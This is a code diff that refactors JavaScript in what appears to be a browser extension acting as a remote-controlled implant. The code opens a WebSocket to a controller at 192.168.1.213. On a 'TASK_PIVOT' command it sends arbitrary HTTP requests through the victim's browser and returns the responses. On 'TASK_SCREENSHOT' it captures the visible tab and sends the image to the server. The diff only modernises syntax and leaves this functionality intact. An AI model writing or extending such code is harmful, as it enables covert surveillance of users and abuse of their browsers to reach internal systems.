@@ -1,9 +1,9 @@
 function base64toarray(data) {
-	var byteString = atob(data);
+    const byteString = atob(data);
     // write the bytes of the string to an ArrayBuffer
-    var ab = new ArrayBuffer(byteString.length);
-    var ia = new Uint8Array(ab);
-    for (var i = 0; i < byteString.length; i++) {
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
         ia[i] = byteString.charCodeAt(i);
     }
 
@@ -16,9 +16,9 @@ function base64toarray(data) {
 
 function httpReq(url,method,headers,body)
 {
-    var xmlHttp = new XMLHttpRequest();    
+    const xmlHttp = new XMLHttpRequest();
     xmlHttp.open( method, url, false ); // false for synchronous request
-	for (var p in headers) {
+	for (const p in headers) {
 		if(headers.hasOwnProperty(p)) {
 			xmlHttp.setRequestHeader(p, headers[p])
 		}
@@ -35,37 +35,38 @@ function httpReq(url,method,headers,body)
 		localStorage["data"] = message;
 	});
 
-	var connection = new WebSocket('ws://192.168.1.213/websocket/');
-	connection.onopen = function(){
+    const connection = new WebSocket('ws://192.168.1.213/websocket/');
+    connection.onopen = function(){
 		console.log('Connection open!');
 		connection.send("init "+ ID);
-	}
+	};
 	connection.onclose = function(){
 		console.log('Connection closed');
-	}
+	};
 	connection.onerror = function(error){
 		console.log('WS Error detected: ' + error);
-	}
+	};
 	connection.onmessage = function(e){
-		var msg = JSON.parse(e.data);
-		console.log("SERVER: " + JSON.stringify(msg));
+        const msg = JSON.parse(e.data);
+        //
+		// console.log("SERVER: " + JSON.stringify(msg));
 		if(msg['task_cmd']==="TASK_PIVOT")
 		{
-			var url = msg['data']['url'];
-			var headers = msg['data']['headers'];
-			var method = msg['data']['method'];
-			var body = msg['data']['body']
-			var response = httpReq(url, method, headers,body);
-			var response_obj = new Object();
-			response_obj.id = msg['id'];
+            const url = msg['data']['url'];
+            const headers = msg['data']['headers'];
+            const method = msg['data']['method'];
+            const body = msg['data']['body'];
+            const response = httpReq(url, method, headers, body);
+            const response_obj = {};
+            response_obj.id = msg['id'];
 			response_obj.status = response.status;
 			response_obj.text = btoa(unescape(encodeURIComponent(response.responseText)));
 			connection.send(JSON.stringify(response_obj));
 		}
-		else if(msg['task_cmd']==="TASK_SCREENCAP")
+		else if(msg['task_cmd']==="TASK_SCREENSHOT")
 		{
 			chrome.tabs.captureVisibleTab(null, function(img) {
-		        var response_obj = new Object();
+		        var response_obj = {};
 		        response_obj.id = msg['id'];
 				response_obj.status = 200;
 				response_obj.text = btoa(unescape(encodeURIComponent(img.toString())));
